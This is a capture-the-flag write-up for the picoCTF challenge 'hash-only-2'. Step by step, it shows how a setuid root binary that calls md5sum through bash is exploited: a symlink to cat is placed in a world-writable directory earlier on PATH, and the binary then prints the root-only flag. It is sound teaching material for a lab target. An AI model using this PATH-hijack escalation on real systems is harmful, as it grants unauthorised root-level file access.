# hash-only-2 #
 
## Overview ##

200 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #setuid`

## Description ##

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

Connect using `ssh <user>@<server> -p <portnum>` with the password, `<password>` and run the binary named `"flaghasher"`.

## Approach ##

Approaching the challenge in a similar manner to the previous [hash-only-1](../hash-only-1/hash-only-1.md).

Listing the current directory, `ctf-player`'s user directory, we don't find any `flaghasher` binary, so it must be on the `PATH` somewhere, lets first locate it.

    $ ls -al
    total 4
    drwxr-xr-x 1 ctf-player ctf-player 20 Mar  7 23:31 .
    drwxr-xr-x 1 root       root       24 Mar  6 19:42 ..
    drwx------ 2 ctf-player ctf-player 34 Mar  7 23:31 .cache
    -rw-r--r-- 1 root       root       67 Mar  6 19:42 .profile

    $ which flaghasher
    /usr/local/bin/flaghasher

Confirming `flahhasher`'s privileges, it is again `setuid` and owned by `root`:

    $ ls -al /usr/local/bin/flaghasher 
    -rwsr-xr-x 1 root root 18312 Mar  6 19:42 /usr/local/bin/flaghasher

We again cannot access `/root` or the flag within `/root/flag.txt`, as expected.

    $ ls /root
    ls: cannot open directory '/root': Permission denied
    $ cat /root/flag.txt
    cat: /root/flag.txt: Permission denied

The binary appears unchanged from the previous challenge, when inspecting its output and the strings within the binary:

    $ flaghasher
    Computing the MD5 hash of /root/flag.txt.... 

    bd0169772370b04ed95b05d74dfbe752  /root/flag.txt

    $ strings /usr/local/bin/flaghasher | grep flag
    Computing the MD5 hash of /root/flag.txt.... 
    /bin/bash -c 'md5sum /root/flag.txt'

Inspecting the privileges of `md5sum` we can see it is no longer writeable by all users, so we cannot simply replace it like in the previous challenge:

    $ ls -al /usr/bin/md5*
    -rwxr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/md5sum
    lrwxrwxrwx 1 root root     6 Sep  5  2019 /usr/bin/md5sum.textutils -> md5sum

But what if we can get another executable to execute prior to this one in `/usr/bin`, for example something located earlier in the configured `PATH`.

From the configured `PATH` environment variable:

    $ set | grep PATH
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

We have a number of possible directories prior to `/usr/bin`, but we have to have sufficient privileges to it.

Looking at the privileges for `/usr/local/bin` it appears we do have sufficient privileges to create a replacement for `md5sum`.

    $ ls -al /usr/local
    total 0
    drwxr-xr-x 1 root root 17 Oct  6  2021 .
    drwxr-xr-x 1 root root 19 Oct  6  2021 ..
    drwxrwxrwx 1 root root 24 Mar  6 19:42 bin
    drwxr-xr-x 2 root root  6 Oct  6  2021 etc
    drwxr-xr-x 2 root root  6 Oct  6  2021 games
    drwxr-xr-x 2 root root  6 Oct  6  2021 include
    drwxr-xr-x 1 root root 23 Mar  6 19:41 lib
    lrwxrwxrwx 1 root root  9 Oct  6  2021 man -> share/man
    drwxr-xr-x 2 root root 24 Oct  6  2021 sbin
    drwxr-xr-x 1 root root 29 Mar  6 19:41 share
    drwxr-xr-x 2 root root  6 Oct  6  2021 src

## Solution ##

Creating a symbolic link to `/usr/bin/cat` named `md5sum` within `/usr/local/bin`, such that it is found prior to `/usr/bin/md5sum` should drop the flag:

    $ ln -s /usr/bin/cat /usr/local/bin/md5sum

Sanity check to verify our `md5sum` is being found first:

    $ which md5sum
    /usr/local/bin/md5sum

Run the challenge to dump the flag:

    $ flaghasher 
    Computing the MD5 hash of /root/flag.txt.... 

    picoCTF{...........redacted.............}

Where the actual flag value has been redacted for the purposes of this write up.
